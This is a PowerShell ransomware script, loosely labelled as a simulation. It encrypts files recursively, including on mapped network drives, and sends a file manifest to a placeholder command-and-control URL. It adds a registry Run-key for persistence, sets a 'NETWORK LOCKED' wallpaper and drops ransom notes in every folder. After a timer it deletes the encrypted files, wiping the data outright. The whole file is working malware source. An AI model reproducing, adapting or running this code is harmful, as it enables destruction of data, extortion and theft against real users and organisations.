param(
    [Parameter(Mandatory=$true)][ValidateSet("Encrypt", "Decrypt")]$Mode,
    [string]$TargetPath = "C:\SimulationData",
    [string]$C2Url = "https://YOUR_C2_IP/api/v1/telemetry", 
    [string]$Passphrase = "12345678901234567890123456789012",
    [int]$Timer = 60
)

# --- CRYPTO ENGINE ---
function Invoke-ApexCipher {
    param ($Path, $Key, $Action)
    $Aes = [System.Security.Cryptography.Aes]::Create()
    $Aes.Key = [System.Text.Encoding]::UTF8.GetBytes($Key)
    if ($Action -eq "Encrypt") {
        $Aes.GenerateIV()
        $Enc = $Aes.CreateEncryptor(); $In = [System.IO.File]::ReadAllBytes($Path)
        $Out = $Enc.TransformFinalBlock($In, 0, $In.Length)
        [System.IO.File]::WriteAllBytes("$Path.locked", ($Aes.IV + $Out))
        Remove-Item $Path -Force
    } else {
        $In = [System.IO.File]::ReadAllBytes($Path)
        $Aes.IV = $In[0..15]; $Cipher = $In[16..($In.Length-1)]
        $Dec = $Aes.CreateDecryptor(); $Plain = $Dec.TransformFinalBlock($Cipher, 0, $Cipher.Length)
        [System.IO.File]::WriteAllBytes($Path.Replace(".locked",""), $Plain)
        Remove-Item $Path -Force
    }
}

# --- EXFILTRATION ---
function Send-Exfil {
    param ($Files)
    $Manifest = $Files | Select-Object Name, Length | ConvertTo-Json
    $Aes = [System.Security.Cryptography.Aes]::Create(); $Aes.Key = [System.Text.Encoding]::UTF8.GetBytes($Passphrase); $Aes.GenerateIV()
    $Enc = $Aes.CreateEncryptor(); $Data = [System.Text.Encoding]::UTF8.GetBytes($Manifest)
    $Cipher = $Enc.TransformFinalBlock($Data, 0, $Data.Length)
    $Payload = [Convert]::ToBase64String($Aes.IV + $Cipher)
    try { Invoke-RestMethod -Uri $C2Url -Method Post -Body (@{payload=$Payload} | ConvertTo-Json) -ContentType "application/json" -SkipCertificateCheck } catch {}
}

# --- VISUAL IMPACTS ---
function Set-Persistence {
    $Cmd = "powershell.exe -WindowStyle Hidden -File `"$PSCommandPath`" -Mode Encrypt"
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "ApexUpdate" -Value $Cmd -Force | Out-Null
}

function Set-Wallpaper {
    $path = "$env:TEMP\bg.bmp"; $bmp = New-Object System.Drawing.Bitmap(1920,1080); $g = [System.Drawing.Graphics]::FromImage($bmp)
    $g.Clear([System.Drawing.Color]::DarkRed); $g.DrawString("NETWORK LOCKED", (New-Object System.Drawing.Font("Impact",80)), [System.Drawing.Brushes]::White, 200, 400)
    $bmp.Save($path); Add-Type '[DllImport("user32.dll")] public static extern int SystemParametersInfo(int u, int p, string l, int f);' -Name "W32" -Namespace "W"
    [W.W32]::SystemParametersInfo(0x14, 0, $path, 1)
}

# --- MAIN LOOP ---
if ($Mode -eq "Encrypt") {
    Add-Type -AssemblyName System.Drawing
    Set-Persistence; Set-Wallpaper
    $Targets = @($TargetPath) + (Get-PSDrive -PSProvider FileSystem | Where-Object {$_.DisplayRoot}).Root
    foreach ($T in $Targets) {
        $Files = Get-ChildItem $T -Recurse -File -ErrorAction SilentlyContinue | Where-Object {$_.Extension -ne ".locked" -and $_.Name -notlike "*RECOVER*"}
        Send-Exfil -Files $Files
        $Dirs = Get-ChildItem $T -Recurse -Directory -ErrorAction SilentlyContinue; $Dirs += Get-Item $T
        foreach ($D in $Dirs) { 
             $NotePath = Join-Path $D.FullName "RECOVER_FILES_NOW.html"
             "<html><body style='background-color:black;color:red;text-align:center;'><h1>!!! SYSTEM ENCRYPTED !!!</h1></body></html>" | Out-File $NotePath -Force
        }
        foreach ($F in $Files) { Invoke-ApexCipher -Path $F.FullName -Key $Passphrase -Action "Encrypt" }
    }
    # COUNTDOWN
    $End = (Get-Date).AddSeconds($Timer)
    while ((Get-Date) -lt $End) { Write-Host "`r[!] DATA WIPE IN: $(($End - (Get-Date)).ToString('mm\:ss'))" -NoNewline -ForegroundColor Red; Start-Sleep 1 }
    Get-ChildItem $TargetPath -Recurse -Filter "*.locked" | Remove-Item -Force
} else {
    Get-ChildItem $TargetPath -Recurse -Filter "*.locked" | ForEach-Object { Invoke-ApexCipher -Path $_.FullName -Key $Passphrase -Action "Decrypt" }
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "ApexUpdate" -ErrorAction SilentlyContinue
}